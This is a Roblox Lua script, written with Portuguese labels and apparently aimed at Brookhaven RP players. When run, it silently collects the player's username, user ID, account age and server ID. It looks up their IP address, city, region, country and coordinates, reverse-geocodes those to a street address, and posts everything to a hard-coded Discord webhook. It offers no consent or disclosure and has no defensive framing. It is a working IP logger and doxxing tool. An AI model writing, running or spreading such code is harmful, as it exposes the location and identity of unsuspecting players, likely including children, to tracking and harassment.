local Webhook_URL = "https://discord.com/api/webhooks/1429972909991923712/PXZIG9JasJ_r-I_QRWyPwoSlF_k9FpCKhPKvCBF4rQtx7HedX9BcLroPuLs6ahtG6XHC"

local function sendToDiscord()
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local LocalPlayer = Players.LocalPlayer

    if not LocalPlayer then return end

    local username = LocalPlayer.Name
    local userId = LocalPlayer.UserId
    local accountAge = LocalPlayer.AccountAge
    local jobId = game.JobId or "N/A"

    local ipInfo = {
        ip = "Desconhecido",
        city = "Desconhecida",
        region = "Desconhecida",
        country = "Desconhecido",
        coordinates = "Desconhecida",
        address = "Desconhecido"
    }

    local ipApiSuccess, ipApiResult = pcall(function()
        return request({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
    end)
    if ipApiSuccess and ipApiResult and ipApiResult.Body then
        local decoded = HttpService:JSONDecode(ipApiResult.Body)
        if decoded.status == "success" then
            ipInfo.ip = decoded.query or ipInfo.ip
            ipInfo.city = decoded.city or ipInfo.city
            ipInfo.region = decoded.regionName or ipInfo.region
            ipInfo.country = decoded.country or ipInfo.country
        end
    end

    local ipInfoSuccess, ipInfoResult = pcall(function()
        return request({
            Url = "https://ipinfo.io/json",
            Method = "GET"
        })
    end)

    if ipInfoSuccess and ipInfoResult and ipInfoResult.Body then
        local decodedInfo = HttpService:JSONDecode(ipInfoResult.Body)
        if decodedInfo.loc then
            ipInfo.coordinates = decodedInfo.loc
        end
    end

    if ipInfo.coordinates ~= "Desconhecida" then
        local lat, lon = ipInfo.coordinates:match("([^,]+),([^,]+)")
        if lat and lon then
            local nominatimSuccess, nominatimResult = pcall(function()
                return request({
                    Url = ("https://nominatim.openstreetmap.org/reverse?format=json&lat=%s&lon=%s"):format(lat, lon),
                    Method = "GET",
                    Headers = {
                        ["User-Agent"] = "RobloxScript/1.0"
                    }
                })
            end)

            if nominatimSuccess and nominatimResult and nominatimResult.Body then
                local nominatimData = HttpService:JSONDecode(nominatimResult.Body)
                if nominatimData and nominatimData.display_name then
                    ipInfo.address = nominatimData.display_name
                end
            end
        end
    end

    local data = {
        ["content"] = "```caso de um b.o```",
        ["embeds"] = {{
            ["title"] = "salvar dados",
            ["fields"] = {
                {["name"] = "Game", ["value"] = "Brookhaven RP 🏡", ["inline"] = false},
                {["name"] = "Usuário", ["value"] = "" .. username .. "", ["inline"] = false},
                {["name"] = "ID do Usuário", ["value"] = "" .. tostring(userId) .. "", ["inline"] = false},
                {["name"] = "Idade da Conta", ["value"] = "" .. tostring(accountAge) .. " dias", ["inline"] = false},
                {["name"] = "Job ID", ["value"] = "" .. jobId .. "", ["inline"] = false},
                {["name"] = "Endereço IP", ["value"] = "" .. ipInfo.ip .. "", ["inline"] = false},
                {["name"] = "País", ["value"] = "" .. ipInfo.country .. "", ["inline"] = false},
                {["name"] = "Estado/Região", ["value"] = "" .. ipInfo.region .. "", ["inline"] = false},
                {["name"] = "Cidade", ["value"] = "" .. ipInfo.city .. "", ["inline"] = false},
                {["name"] = "Coordenadas", ["value"] = "" .. ipInfo.coordinates .. "", ["inline"] = false},
                {["name"] = "Localização", ["value"] = "" .. ipInfo.address .. "", ["inline"] = false}
            },
            ["color"] = 16711680
        }}
    }

    request({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end


sendToDiscord()
